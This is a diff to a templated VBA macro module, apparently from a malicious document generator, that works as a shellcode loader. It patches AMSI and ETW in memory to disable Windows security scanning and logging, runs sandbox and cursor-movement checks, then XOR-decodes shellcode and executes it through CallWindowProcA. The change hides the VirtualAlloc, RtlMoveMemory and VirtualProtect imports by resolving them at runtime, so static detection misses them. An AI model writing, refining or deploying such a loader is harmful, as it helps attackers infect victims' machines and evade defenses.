@@ -2,22 +2,18 @@ Attribute VB_Name = "{{ v.module_name }}"
 Option Explicit
 
 #If VBA7 Then
-    Private Declare PtrSafe Function {{ v.fn_valloc }} Lib "kernel32" Alias "VirtualAlloc" _
-        (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, _
-         ByVal flProtect As Long) As LongPtr
-    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" _
-        (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long) As LongPtr
     Private Declare PtrSafe Function {{ v.fn_callwp }} Lib "user32" Alias "CallWindowProcA" _
         (ByVal lpPrevWndFunc As LongPtr, ByVal hWnd As LongPtr, _
-         ByVal Msg As Long, ByVal wParam As LongPtr, ByVal lParam As LongPtr) As LongPtr
-    Private Declare PtrSafe Function VirtualProtect Lib "kernel32" _
-        (ByVal lpAddress As LongPtr, ByVal dwSize As Long, _
-         ByVal flNewProtect As Long, ByRef lpflOldProtect As Long) As Long
+         ByVal Msg As LongPtr, ByVal wParam As LongPtr, ByVal lParam As LongPtr) As LongPtr
     Private Declare PtrSafe Function LoadLibraryA Lib "kernel32" (ByVal lpLibFileName As String) As LongPtr
     Private Declare PtrSafe Function GetProcAddress Lib "kernel32" _
         (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
     Private Declare PtrSafe Function GetCursorPos Lib "user32" (lpPoint As Any) As Long
 #End If
+
+Private {{ v.fn_valloc }} As LongPtr
+Private {{ v.fn_movemem }} As LongPtr
+Private {{ v.fn_vprotect }} As LongPtr
 
 Private Function {{ v.fn_build_str }}(codes() As Integer) As String
     Dim s As String, i As Long
@@ -36,11 +32,11 @@ Private Sub {{ v.fn_amsi_patch }}()
     Dim scanAddr As LongPtr: scanAddr = GetProcAddress(amsiBase, scanName)
     If scanAddr = 0 Then Exit Sub
     Dim oldP As Long
-    VirtualProtect scanAddr, 6, &H40, oldP
+    {{ v.fn_callwp }} {{ v.fn_vprotect }}, scanAddr, 6, &H40, VarPtr(oldP)
     Dim patch(0 To 5) As Byte
     patch(0) = &HB8: patch(1) = &H57: patch(2) = &H0: patch(3) = &H7: patch(4) = &H80: patch(5) = &HC3
-    RtlMoveMemory scanAddr, patch(0), 6
-    VirtualProtect scanAddr, 6, oldP, oldP
+    {{ v.fn_callwp }} {{ v.fn_movemem }}, scanAddr, VarPtr(patch(0)), 6, 0
+    {{ v.fn_callwp }} {{ v.fn_vprotect }}, scanAddr, 6, oldP, VarPtr(oldP)
 End Sub
 
 Private Sub {{ v.fn_etw_patch }}()
@@ -52,11 +48,11 @@ Private Sub {{ v.fn_etw_patch }}()
     Dim etwAddr As LongPtr: etwAddr = GetProcAddress(ntdllBase, etwName)
     If etwAddr = 0 Then Exit Sub
     Dim oldP As Long
-    VirtualProtect etwAddr, 4, &H40, oldP
+    {{ v.fn_callwp }} {{ v.fn_vprotect }}, etwAddr, 4, &H40, VarPtr(oldP)
     Dim p(0 To 3) As Byte
     p(0) = &H31: p(1) = &HC0: p(2) = &HC3: p(3) = &H90
-    RtlMoveMemory etwAddr, p(0), 4
-    VirtualProtect etwAddr, 4, oldP, oldP
+    {{ v.fn_callwp }} {{ v.fn_movemem }}, etwAddr, VarPtr(p(0)), 4, 0
+    {{ v.fn_callwp }} {{ v.fn_vprotect }}, etwAddr, 4, oldP, VarPtr(oldP)
 End Sub
 
 Private Function {{ v.fn_hex2arr }}(hex As String) As Byte()
@@ -175,6 +171,11 @@ End Function
 
 Private Sub {{ v.fn_exec }}()
     If {{ v.fn_sandbox }}() Then Exit Sub
+    Dim k32 As LongPtr: k32 = LoadLibraryA({{ v.vba_kernel32 }})
+    {{ v.fn_valloc }}  = GetProcAddress(k32, {{ v.vba_virtual_alloc }})
+    {{ v.fn_movemem }} = GetProcAddress(k32, {{ v.vba_rtl_move_mem }})
+    {{ v.fn_vprotect }} = GetProcAddress(k32, {{ v.vba_virtual_protect }})
+    If {{ v.fn_valloc }} = 0 Or {{ v.fn_movemem }} = 0 Or {{ v.fn_vprotect }} = 0 Then Exit Sub
     ' Record cursor before delay; check movement after — no extra wait
     Dim _pt1(1) As Long, _pt2(1) As Long
     GetCursorPos _pt1(0)
@@ -200,10 +201,11 @@ Private Sub {{ v.fn_exec }}()
     sc  = {{ v.fn_xor }}(raw, _k)
 
     Dim mem As LongPtr
-    mem = {{ v.fn_valloc }}(0, UBound(sc) + 1, &H3000, &H04)
-    RtlMoveMemory mem, sc(0), UBound(sc) + 1
+    mem = {{ v.fn_callwp }}({{ v.fn_valloc }}, 0, UBound(sc) + 1, &H3000, &H04)
+    If mem = 0 Then Exit Sub
+    {{ v.fn_callwp }} {{ v.fn_movemem }}, mem, VarPtr(sc(0)), UBound(sc) + 1, 0
     Dim oldP As Long
-    VirtualProtect mem, UBound(sc) + 1, &H20, oldP
+    {{ v.fn_callwp }} {{ v.fn_vprotect }}, mem, UBound(sc) + 1, &H20, VarPtr(oldP)
 
     {{ v.fn_callwp }} mem, 0, 0, 0, 0
 End Sub
